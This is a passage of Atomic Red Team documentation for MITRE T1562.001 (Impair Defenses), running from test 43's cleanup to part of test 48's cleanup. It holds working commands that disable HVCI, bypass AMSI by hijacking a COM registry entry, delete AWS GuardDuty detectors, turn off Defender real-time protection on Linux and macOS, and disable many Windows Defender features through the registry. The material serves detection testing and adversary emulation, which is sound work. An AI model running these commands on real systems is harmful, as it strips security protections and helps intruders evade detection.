<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">43</span>
</pre></div>
</div>
</div>
</div>
<section id="id62">
<h4>Cleanup:<a class="headerlink" href="#id62" title="Permalink to this heading">#</a></h4>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>swapon<span class="w"> </span>-a
sleep<span class="w"> </span><span class="m">2</span>
sync
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">43</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-44-disable-hypervisor-enforced-code-integrity-hvci">
<h3>Atomic Test #44 - Disable Hypervisor-Enforced Code Integrity (HVCI)<a class="headerlink" href="#atomic-test-44-disable-hypervisor-enforced-code-integrity-hvci" title="Permalink to this heading">#</a></h3>
<p>This test disables Hypervisor-Enforced Code Integrity (HVCI) by setting the registry key HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity “Enabled” value to “0”.
The pre-req needs to be ran in order to setup HVCI and have it enabled.
We do not recommend running this in production.
<a class="reference external" href="https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/">Black Lotus Campaign</a>
<a class="reference external" href="https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity">Microsoft</a></p>
<p><strong>Supported Platforms:</strong> windows</p>
<p>Elevation Required (e.g. root or admin)</p>
<section id="id63">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id63" title="Permalink to this heading">#</a></h4>
<section id="description-hvci-must-be-enabled">
<h5>Description: HVCI must be enabled<a class="headerlink" href="#description-hvci-must-be-enabled" title="Permalink to this heading">#</a></h5>
</section>
<section id="id64">
<h5>Check Prereq Commands:<a class="headerlink" href="#id64" title="Permalink to this heading">#</a></h5>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(((</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&quot;reg query &quot;</span><span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">DeviceGuard</span><span class="s2">&quot; /v &quot;</span><span class="n">EnableVirtualizationBasedSecurity</span><span class="s2">&quot; 2&gt; nul | findstr EnableVirtualizationBasedSecurity 2&gt; nul&quot;</span><span class="p">)</span> <span class="o">-and</span> <span class="p">(</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&quot;reg query &quot;</span><span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">DeviceGuard</span><span class="s2">&quot; /v &quot;</span><span class="n">RequirePlatformSecurityFeatures</span><span class="s2">&quot; 2&gt; nul | findstr RequirePlatformSecurityFeatures 2&gt; nul&quot;</span><span class="p">)</span> <span class="o">-and</span> <span class="p">(</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&quot;reg query &quot;</span><span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">DeviceGuard</span><span class="s2">&quot; /v &quot;</span><span class="n">Locked</span><span class="s2">&quot; 2&gt; nul | findstr Locked 2&gt; nul&quot;</span><span class="p">)</span> <span class="o">-and</span> <span class="p">(</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&quot;reg query &quot;</span><span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">DeviceGuard</span><span class="p">\</span><span class="n">Scenarios</span><span class="p">\</span><span class="n">HypervisorEnforcedCodeIntegrity</span><span class="s2">&quot; /v &quot;</span><span class="n">Enabled</span><span class="s2">&quot; 2&gt; nul | findstr Enabled 2&gt; nul&quot;</span><span class="p">)</span> <span class="o">-and</span> <span class="p">(</span><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&quot;reg query &quot;</span><span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Control</span><span class="p">\</span><span class="n">DeviceGuard</span><span class="p">\</span><span class="n">Scenarios</span><span class="p">\</span><span class="n">HypervisorEnforcedCodeIntegrity</span><span class="s2">&quot; /v &quot;</span><span class="n">Locked</span><span class="s2">&quot; 2&gt; nul | findstr Locked 2&gt; nul&quot;</span><span class="p">)))</span> <span class="p">{</span> <span class="n">exit</span> <span class="n">0</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="n">exit</span> <span class="n">1</span> <span class="p">}</span>
</pre></div>
</div>
</section>
<section id="id65">
<h5>Get Prereq Commands:<a class="headerlink" href="#id65" title="Permalink to this heading">#</a></h5>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;EnableVirtualizationBasedSecurity&quot;</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">1</span> <span class="p">/</span><span class="n">f</span>
<span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;RequirePlatformSecurityFeatures&quot;</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">1</span> <span class="p">/</span><span class="n">f</span>
<span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;Locked&quot;</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">0</span> <span class="p">/</span><span class="n">f</span>
<span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;Enabled&quot;</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">1</span> <span class="p">/</span><span class="n">f</span>
<span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;Locked&quot;</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">0</span> <span class="p">/</span><span class="n">f</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">44</span> <span class="n">-GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="id66">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id66" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">reg</span> <span class="n">add</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;Enabled&quot;</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">0</span> <span class="p">/</span><span class="n">f</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">44</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="id67">
<h4>Cleanup:<a class="headerlink" href="#id67" title="Permalink to this heading">#</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">reg</span> <span class="n">delete</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;EnableVirtualizationBasedSecurity&quot;</span> <span class="p">/</span><span class="n">f</span>
<span class="n">reg</span> <span class="n">delete</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;RequirePlatformSecurityFeatures&quot;</span> <span class="p">/</span><span class="n">f</span>
<span class="n">reg</span> <span class="n">delete</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;Locked&quot;</span> <span class="p">/</span><span class="n">f</span>
<span class="n">reg</span> <span class="n">delete</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;Enabled&quot;</span> <span class="p">/</span><span class="n">f</span>
<span class="n">reg</span> <span class="n">delete</span> <span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;Locked&quot;</span> <span class="p">/</span><span class="n">f</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">44</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-45-amsi-bypass-override-amsi-via-comwith-administrative-rights-an-adversary-can-disable-amsi-via-registry-value-in-hkcu-software-classes-clsid-fdb00e52-a214-4aa1-8fba-4357bb0072ec-by-overriding-the-microsoft-defender-com-object-for-amsi-and-points-it-to-a-dll-that-does-not-exist">
<h3>Atomic Test #45 - AMSI Bypass - Override AMSI via COMWith administrative rights, an adversary can disable AMSI via registry value in HKCU\Software\Classes\CLSID{fdb00e52-a214-4aa1-8fba-4357bb0072ec} by overriding the Microsoft Defender COM object for AMSI and points it to a DLL that does not exist.<a class="headerlink" href="#atomic-test-45-amsi-bypass-override-amsi-via-comwith-administrative-rights-an-adversary-can-disable-amsi-via-registry-value-in-hkcu-software-classes-clsid-fdb00e52-a214-4aa1-8fba-4357bb0072ec-by-overriding-the-microsoft-defender-com-object-for-amsi-and-points-it-to-a-dll-that-does-not-exist" title="Permalink to this heading">#</a></h3>
<p>This is currently being used by AsyncRAT and others.
<a class="reference external" href="https://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html">https://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html</a>
<a class="reference external" href="https://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/">https://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/</a>
<strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code></p>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">45</span>
</pre></div>
</div>
</div>
</div>
<section id="id68">
<h4>Cleanup:<a class="headerlink" href="#id68" title="Permalink to this heading">#</a></h4>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>REG DELETE HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /f
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">45</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-46-aws-guardduty-suspension-or-deletion">
<h3>Atomic Test #46 - AWS - GuardDuty Suspension or Deletion<a class="headerlink" href="#atomic-test-46-aws-guardduty-suspension-or-deletion" title="Permalink to this heading">#</a></h3>
<p>Enables GuardDuty in AWS, upon successful creation this test will suspend and then delete the GuardDuty configuration.</p>
<p><strong>Supported Platforms:</strong> iaas:aws</p>
<p>Elevation Required (e.g. root or admin)</p>
<section id="dependencies-run-with-bash">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">bash</span></code>!<a class="headerlink" href="#dependencies-run-with-bash" title="Permalink to this heading">#</a></h4>
<section id="description-check-if-aws-credentials-file-has-a-default-stanza-is-configured">
<h5>Description: Check if ~/.aws/credentials file has a default stanza is configured<a class="headerlink" href="#description-check-if-aws-credentials-file-has-a-default-stanza-is-configured" title="Permalink to this heading">#</a></h5>
</section>
<section id="id69">
<h5>Check Prereq Commands:<a class="headerlink" href="#id69" title="Permalink to this heading">#</a></h5>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>cat<span class="w"> </span>~/.aws/credentials<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;default&quot;</span>
</pre></div>
</div>
</section>
<section id="id70">
<h5>Get Prereq Commands:<a class="headerlink" href="#id70" title="Permalink to this heading">#</a></h5>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Please install the aws-cli and configure your AWS default profile using: aws configure&quot;</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">46</span> <span class="n">-GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="attack-commands-run-with-bash">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">bash</span></code><a class="headerlink" href="#attack-commands-run-with-bash" title="Permalink to this heading">#</a></h4>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">detectorId</span><span class="o">=</span><span class="k">$(</span>aws<span class="w"> </span>guardduty<span class="w"> </span>create-detector<span class="w"> </span>--enable<span class="w"> </span>--region<span class="w"> </span><span class="s2">&quot;us-east-1&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-oP<span class="w"> </span><span class="s1">&#39;(?&lt;=&quot;DetectorId&quot;: &quot;)[^&quot;]*&#39;</span><span class="k">)</span>
aws<span class="w"> </span>guardduty<span class="w"> </span>update-detector<span class="w"> </span>--no-enable<span class="w"> </span>--detector-id<span class="w"> </span><span class="nv">$detectorId</span>
aws<span class="w"> </span>guardduty<span class="w"> </span>delete-detector<span class="w"> </span>--detector-id<span class="w"> </span><span class="nv">$detectorId</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">46</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="id71">
<h4>Cleanup:<a class="headerlink" href="#id71" title="Permalink to this heading">#</a></h4>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;If test successfully ran, no cleanup required.&quot;</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">46</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-47-tamper-with-defender-atp-on-linux-macoswith-root-privileges-an-adversary-can-disable-real-time-protection-note-this-test-assumes-defender-is-not-in-passive-mode-and-real-time-protection-is-enabled-the-use-of-a-managed-json-on-linux-or-defender-plist-on-macos-will-prevent-these-changes-tamper-protection-will-also-prevent-this-available-on-macos-but-not-linux-at-the-time-of-writing-installation-of-mdatp-is-a-prerequisite-installation-steps-vary-across-macos-and-linux-distros-see-microsoft-public-documentation-for-instructions-https-learn-microsoft-com-en-us-microsoft-365-security-defender-endpoint-mac-install-manually-view-o365-worldwide-https-learn-microsoft-com-en-us-microsoft-365-security-defender-endpoint-linux-install-manually-view-o365-worldwide">
<h3>Atomic Test #47 - Tamper with Defender ATP on Linux/MacOSWith root privileges, an adversary can disable real time protection. Note, this test assumes Defender is not in passive mode and real-time protection is enabled. The use of a managed.json on Linux or Defender .plist on MacOS will prevent these changes. Tamper protection will also prevent this (available on MacOS, but not Linux at the time of writing). Installation of MDATP is a prerequisite. Installation steps vary across MacOS and Linux distros. See Microsoft public documentation for instructions: <a class="reference external" href="https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide">https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide</a> <a class="reference external" href="https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide">https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide</a><a class="headerlink" href="#atomic-test-47-tamper-with-defender-atp-on-linux-macoswith-root-privileges-an-adversary-can-disable-real-time-protection-note-this-test-assumes-defender-is-not-in-passive-mode-and-real-time-protection-is-enabled-the-use-of-a-managed-json-on-linux-or-defender-plist-on-macos-will-prevent-these-changes-tamper-protection-will-also-prevent-this-available-on-macos-but-not-linux-at-the-time-of-writing-installation-of-mdatp-is-a-prerequisite-installation-steps-vary-across-macos-and-linux-distros-see-microsoft-public-documentation-for-instructions-https-learn-microsoft-com-en-us-microsoft-365-security-defender-endpoint-mac-install-manually-view-o365-worldwide-https-learn-microsoft-com-en-us-microsoft-365-security-defender-endpoint-linux-install-manually-view-o365-worldwide" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> linux, macos
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>mdatp<span class="w"> </span>config<span class="w"> </span>real-time-protection<span class="w"> </span>--value<span class="w"> </span>disabled
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">47</span>
</pre></div>
</div>
</div>
</div>
<section id="id72">
<h4>Cleanup:<a class="headerlink" href="#id72" title="Permalink to this heading">#</a></h4>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>mdatp<span class="w"> </span>config<span class="w"> </span>real-time-protection<span class="w"> </span>--value<span class="w"> </span>enabled
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">47</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-48-tamper-with-windows-defender-registry-reg-exedisable-windows-defender-by-tampering-with-windows-defender-registry-using-the-utility-reg-exe">
<h3>Atomic Test #48 - Tamper with Windows Defender Registry - Reg.exeDisable Windows Defender by tampering with windows defender registry using the utility “reg.exe”<a class="headerlink" href="#atomic-test-48-tamper-with-windows-defender-registry-reg-exedisable-windows-defender-by-tampering-with-windows-defender-registry-using-the-utility-reg-exe" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code></p>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender&quot; /v &quot;DisableAntiSpyware&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender&quot; /v &quot;DisableAntiVirus&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableBehaviorMonitoring&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableIntrusionPreventionSystem&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableIOAVProtection&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableOnAccessProtection&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableRealtimeMonitoring&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableRoutinelyTakingAction&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableScanOnRealtimeEnable&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableScriptScanning&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Reporting&quot; /v &quot;DisableEnhancedNotifications&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul 
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet&quot; /v &quot;DisableBlockAtFirstSeen&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet&quot; /v &quot;SpynetReporting&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine&quot; /v &quot;MpEnablePus&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection&quot; /v &quot;DisallowExploitProtectionOverride&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\SOFTWARE\Microsoft\Windows Defender\Features&quot; /v &quot;TamperProtection&quot;  /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\software\microsoft\windows defender\spynet&quot; /v &quot;SubmitSamplesConsent&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Microsoft\Windows Defender&quot; /v &quot;PUAProtection&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">48</span>
</pre></div>
</div>
</div>
</div>
<section id="id73">
<h4>Cleanup:<a class="headerlink" href="#id73" title="Permalink to this heading">#</a></h4>
<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender&quot; /v &quot;DisableAntiSpyware&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender&quot; /v &quot;DisableAntiVirus&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableBehaviorMonitoring&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableIntrusionPreventionSystem&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableIOAVProtection&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableOnAccessProtection&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableRealtimeMonitoring&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableRoutinelyTakingAction&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableScanOnRealtimeEnable&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection&quot; /v &quot;DisableScriptScanning&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\Reporting&quot; /v &quot;DisableEnhancedNotifications&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul 
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet&quot; /v &quot;DisableBlockAtFirstSeen&quot; /t REG_DWORD /d &quot;0&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet&quot; /v &quot;SpynetReporting&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine&quot; /v &quot;MpEnablePus&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Policies\Microsoft\Windows Defender Security Center\App and Browser protection&quot; /v &quot;DisallowExploitProtectionOverride&quot; /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
reg add &quot;HKLM\Software\Microsoft\Windows Defender\Features&quot; /v &quot;TamperProtection&quot;  /t REG_DWORD /d &quot;1&quot; /f &gt;NUL 2&gt;nul
